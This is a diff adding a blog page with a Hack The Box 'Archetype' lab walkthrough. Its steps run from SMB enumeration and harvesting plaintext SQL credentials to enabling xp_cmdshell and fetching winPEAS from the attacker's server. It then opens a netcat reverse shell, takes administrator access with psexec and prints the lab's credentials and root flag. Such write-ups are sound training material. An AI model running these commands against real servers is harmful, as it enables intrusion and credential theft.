@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB-Archetype :: ML</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB-Archetype writeup" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/archetype/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB-Archetype">
+<meta property="og:description" content="HTB-Archetype writeup" />
+<meta property="og:url" content="/posts/archetype/" />
+<meta property="og:site_name" content="ML" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-09-28 11:38:57 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Home
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/htb">HTB</a></li>
+        
+      
+        
+          <li><a href="/reti">Reti</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/htb">HTB</a></li>
+      
+    
+      
+        <li><a href="/reti">Reti</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/archetype/">HTB-Archetype</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-09-28
+        
+      </span>
+    
+    
+    
+  </div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        
+  <figure class="left" >
+    <img src="/ox-hugo/Archetype.png"   />
+    
+  </figure>
+
+
+<hr>
+<h2 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Hi everyone,</p>
+<p>this is a full tutorial of the Starting Point machine &ldquo;Archetype&rdquo;
+on hack the box. If you have any suggestion / correction please contact
+me at <strong><a href="mailto:matteolugli18@gmail.com">matteolugli18@gmail.com</a></strong>.</p>
+<p>I will enable comments soon.</p>
+<p>Enjoy.</p>
+<hr>
+<h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I always start htb boxes with nmap enumeration.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-09-21 18:40 CEST
+Nmap scan report <span style="color:#66d9ef">for</span> Archetype <span style="color:#f92672">(</span>10.129.206.73<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server <span style="color:#ae81ff">2017</span> 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   Target_Name: ARCHETYPE
+|   NetBIOS_Domain_Name: ARCHETYPE
+|   NetBIOS_Computer_Name: ARCHETYPE
+|   DNS_Domain_Name: Archetype
+|   DNS_Computer_Name: Archetype
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2022-09-21T16:36:23
+|_Not valid after:  2052-09-21T16:36:23
+|_ssl-date: 2022-09-21T16:41:18+00:00; 0s from scanner time.
+Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2022-09-21T16:41:11
+|_  start_date: N/A
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+| smb-os-discovery:
+|   OS: Windows Server <span style="color:#ae81ff">2019</span> Standard <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2019</span> Standard 6.3<span style="color:#f92672">)</span>
+|   Computer name: Archetype
+|   NetBIOS computer name: ARCHETYPE<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Workgroup: WORKGROUP<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|_  System time: 2022-09-21T09:41:10-07:00
+| ms-sql-info:
+|   10.129.206.73:1433:
+|     Version:
+|       name: Microsoft SQL Server <span style="color:#ae81ff">2017</span> RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server <span style="color:#ae81ff">2017</span>
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: <span style="color:#ae81ff">1433</span>
+|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
+</code></pre></div><ol>
+<li>
+<p><strong>msrpc, port 135</strong> (Microsoft Remote Procedure Call): it is a protocol that
+enables one program to request a service from a program on
+another computer. It works in direct comunication with other
+network protocols (such as SMB or TCP) to make service requests on
+a remote server.</p>
+</li>
+<li>
+<p><strong>netbios-ssn, port 139</strong>:  netbios is a transportation layer that
+works with file sharing protocols like SMB, to allow file sharing
+on the same network.</p>
+</li>
+<li>
+<p><strong>microsoft-ds, port 445</strong>: Later versions of SMB began to use
+port 445 on top of a TCP stack. This allows SMB to work over
+the internet.</p>
+<p>More informations here <a href="https://www.varonis.com/blog/smb-port">https://www.varonis.com/blog/smb-port</a> if
+you are interested.</p>
+</li>
+<li>
+<p><strong>ms-sql-s, port 1443</strong>: just a microsoft sql-server.</p>
+</li>
+</ol>
+<hr>
+<h2 id="smb-client">SMB client<a href="#smb-client" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Given what we discovered during enumeration, the simplest thing to
+try is connecting to the machine using SMB client.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype
+
+     Sharename       Type      Comment
+     ---------       ----      -------
+     ADMIN$          Disk      Remote Admin
+     backups         Disk
+     C$              Disk      Default share
+     IPC$            IPC       Remote IPC
+</code></pre></div><ul>
+<li><strong>-N</strong>: I used this flag to suppres the password prompt, because we don&rsquo;t
+have an access password. This time we got lucky and listed all the
+shares successfully.</li>
+<li><strong>-L</strong>: this flag is used when you want to list all the services hosted
+on a particular server.</li>
+</ul>
+<p>We notice the share called <strong>backups</strong>, which is the only non-admin share,
+that we might be able to access. Let&rsquo;s do it using this command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
+  prod.dtsConfig                     AR      <span style="color:#ae81ff">609</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:23:02 <span style="color:#ae81ff">2020</span>
+
+	      <span style="color:#ae81ff">5056511</span> blocks of size 4096. <span style="color:#ae81ff">2616242</span> blocks available
+</code></pre></div><p>Looks like there is a suspicious file: prod.dtsConfig.
+Let&rsquo;s take a peek and check what&rsquo;s in there:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig
+
+&lt;DTSConfiguration&gt;
+    &lt;DTSConfigurationHeading&gt;
+	&lt;DTSConfigurationFileInfo GeneratedBy<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedFromPackageName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedFromPackageID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;...&#34;</span> GeneratedDate<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;20.1.2019 10:01:34&#34;</span>/&gt;
+    &lt;/DTSConfigurationHeading&gt;
+    &lt;Configuration ConfiguredType<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Property&#34;</span> Path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> ValueType<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;String&#34;</span>&gt;
+	&lt;ConfiguredValue&gt;Data Source<span style="color:#f92672">=</span>.;Password<span style="color:#f92672">=</span>M3g4c0rp123;User ID<span style="color:#f92672">=</span>ARCHETYPE<span style="color:#ae81ff">\s</span>ql_svc;Initial Catalog<span style="color:#f92672">=</span>Catalog;Provider<span style="color:#f92672">=</span>SQLNCLI10.1;Persist Security Info<span style="color:#f92672">=</span>True;Auto Translate<span style="color:#f92672">=</span>False;&lt;/ConfiguredValue&gt;
+    &lt;/Configuration&gt;
+&lt;/DTSConfiguration&gt;
+</code></pre></div><p>We found some unprotected credentials!</p>
+<p><strong>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</strong>.</p>
+<hr>
+<h2 id="impacket">Impacket<a href="#impacket" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>A simple way to connect to the ms-sql server is using <strong>mssqlclient.py</strong>,
+a really usefull tool when working with Windows network protocols.
+It is part of the collection of python scripts called <strong>impacket</strong>.
+You can find the download links here</p>
+<p><a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
+<p>At the beginning I struggled with finding the documentation for this tool, so i just runned
+the script with no options:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+
+usage: mssqlclient.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-port PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-db DB<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-windows-auth<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-debug<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-file FILE<span style="color:#f92672">]</span>
+		      <span style="color:#f92672">[</span>-hashes LMHASH:NTHASH<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-no-pass<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-k<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-aesKey hex key<span style="color:#f92672">]</span>
+		      <span style="color:#f92672">[</span>-dc-ip ip address<span style="color:#f92672">]</span>
+		      target
+
+TDS client implementation <span style="color:#f92672">(</span>SSL supported<span style="color:#f92672">)</span>.
+
+positional arguments:
+  target                <span style="color:#f92672">[[</span>domain/<span style="color:#f92672">]</span>username<span style="color:#f92672">[</span>:password<span style="color:#f92672">]</span>@<span style="color:#f92672">]</span>&lt;targetName or address&gt;
+
+options:
+  -h, --help            show this help message and exit
+  -port PORT            target MSSQL port <span style="color:#f92672">(</span>default 1433<span style="color:#f92672">)</span>
+  -db DB                MSSQL database instance <span style="color:#f92672">(</span>default None<span style="color:#f92672">)</span>
+  -windows-auth         whether or not to use Windows Authentication <span style="color:#f92672">(</span>default False<span style="color:#f92672">)</span>
+  -debug                Turn DEBUG output ON
+  -file FILE            input file with commands to execute in the SQL shell
+</code></pre></div><p>After a little bit i figured out the correct way to write the command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
+&lt;client.py Archetype/sql_svc@10.129.206.73 -windows-auth
+Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+
+Password:&lt;insert password&gt;
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server<span style="color:#ae81ff">\0\0</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">140</span> 3232<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</code></pre></div><p>There we go, looks like we can send commands, so i tried
+to run a simple query:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
+master
+tempdb
+model
+msdb
+</code></pre></div><hr>
+<h2 id="command-shell">Command Shell<a href="#command-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I found out that there is a way to execute commands remotly if we have access
+to a ms-sql server: we can use a <em>stored procedure</em> called <strong>xp_cmdshell</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;
+
+[<span style="color:#f92672">-</span>] ERROR(ARCHETYPE): Line <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">SQL</span> Server blocked <span style="color:#66d9ef">access</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">procedure</span> <span style="color:#e6db74">&#39;sys.xp_cmdshell&#39;</span>
+<span style="color:#66d9ef">of</span> component <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> because this component <span style="color:#66d9ef">is</span> turned <span style="color:#66d9ef">off</span> <span style="color:#66d9ef">as</span> part <span style="color:#66d9ef">of</span> the <span style="color:#66d9ef">security</span> configuration <span style="color:#66d9ef">for</span> this server.
+A <span style="color:#66d9ef">system</span> administrator can enable the use <span style="color:#66d9ef">of</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> <span style="color:#66d9ef">by</span> <span style="color:#66d9ef">using</span> sp_configure.
+<span style="color:#66d9ef">For</span> <span style="color:#66d9ef">more</span> information about enabling <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>,
+<span style="color:#66d9ef">search</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">SQL</span> Server Books Online.
+</code></pre></div><p>Turns out that we don&rsquo;t have the permission to do that, because xp_cmdshell
+is disabled in the configuration file. Let&rsquo;s try to follow the suggestion
+given by the error prompt ('[&hellip;] <em>A system administrator can enable the use of &lsquo;xp_cmdshell&rsquo; by using sp_configure</em>.').</p>
+<p>With a quick google search i found out the correct way of using <strong>sp_configure</strong> to
+enable the shell. (Maybie we are lucky and we can do it without admin privileges).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+[<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
+<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> reconfigure
+reconfigure
+<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> RECONFIGURE
+RECONFIGURE
+<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+<span style="color:#66d9ef">EXEC</span> sp_configure <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+[<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
+<span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> RECONFIGURE
+RECONFIGURE
+</code></pre></div><p>We can now re-try to send the previous command (<em>EXEC xp_cmdshell &lsquo;dir *.exe&rsquo;;'</em>),
+and we get a huge output. (It is not reported here, but all the executable files
+in the cwd should be listed in your terminal).</p>
+<hr>
+<h2 id="winpeas">WinPEAS<a href="#winpeas" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Not sure what to do next, i followed htb suggestion and looked up at
+the tool called <strong>Winpeas</strong>, a python script used to help attackers
+with <em>privilege escalation</em> on windows machines.
+It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine.
+To install it on kali or any debian-based distribution you can use the following
+command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
+</code></pre></div><p>Use this other command to locate all the executable files that you
+just downloaded:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
+&gt; peass ~ Privilege Escalation Awesome Scripts SUITE
+
+/usr/share/peass/winpeas
+ winPEASany.exe
+ winPEASany_ofs.exe
+ winPEAS.bat
+ winPEASx64.exe
+ winPEASx64_ofs.exe
+ winPEASx86.exe
+ winPEASx86_ofs.exe
+</code></pre></div><p>Now I had to find a way to inject the executable file in the server.
+A simple way of doing it is setting up a python server on the local
+machine (that is by-default listening on port 8000).
+<strong><em>Remember to run the command from the directory where the winpeas .exe
+files are stored!</em></strong> (I lost a lot of time on this one point).</p>
+<p>The directory should be /usr/share/peass/winpeas.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
+</code></pre></div><p>Now we can use <strong>powershell</strong> to inject the file!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+</code></pre></div><p>The file should be loaded in the target machine. Now it&rsquo;s just matter
+of executing it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+
+[...]
+<span style="color:#960050;background-color:#1e0010">╔══════════╣</span> <span style="color:#66d9ef">Found</span> History Files
+
+File: <span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>sql_svc<span style="color:#960050;background-color:#1e0010">\</span>AppData<span style="color:#960050;background-color:#1e0010">\</span>Roaming<span style="color:#960050;background-color:#1e0010">\</span>Microsoft<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>PowerShell<span style="color:#960050;background-color:#1e0010">\</span>PSReadLine<span style="color:#960050;background-color:#1e0010">\</span>ConsoleHost_history.txt
+
+<span style="color:#66d9ef">NULL</span>
+[...]
+</code></pre></div><p>History files are usually vulnerable and a good source of information,
+let&rsquo;s see what&rsquo;s inside:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;
+
+net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Archetype<span style="color:#960050;background-color:#1e0010">\</span>backups <span style="color:#f92672">/</span><span style="color:#66d9ef">user</span>:administrator MEGACORP_4dm1n<span style="color:#f92672">!!</span>
+</code></pre></div><p>We found administrator credentials!</p>
+<ul>
+<li><strong>user</strong>: administrator</li>
+<li><strong>password</strong>: MEGACORP_4dm1n!!</li>
+</ul>
+<h2 id="reverseshell">ReverseShell<a href="#reverseshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now that we have admin credentials, it&rsquo;s time to spawn a reverse-shell.</p>
+<p><a href="https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/">https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
+</code></pre></div><p>Now we can just navigate to C:\Users\sql_svc\Desktop and get the
+user flag.
+We are not done yet, because we still have to find the <strong>root flag</strong>.</p>
+<p>Turns out that in Windows you can&rsquo;t change privileges from inside the
+cmd prompt, so we need to find a way to spawn a shell <em>as administrator</em>.
+Guess what, impacket will help us one more time!
+<a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes">https://blog.ropnop.com/using-credentials-to-own-windows-boxes</a></p>
+<p>We can use <strong>psexec.py</strong> to do exactly what we need:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
+</code></pre></div><p>Now just navigate to C:\Users\Administrator\Desktop and get
+the root flag. You can use</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
+</code></pre></div><blockquote>
+<p>root flag &ndash;&gt; b91ccec3305e98240082d4474b848528</p>
+</blockquote>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/three/">
+                <span class="button__text">HTB-Three</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
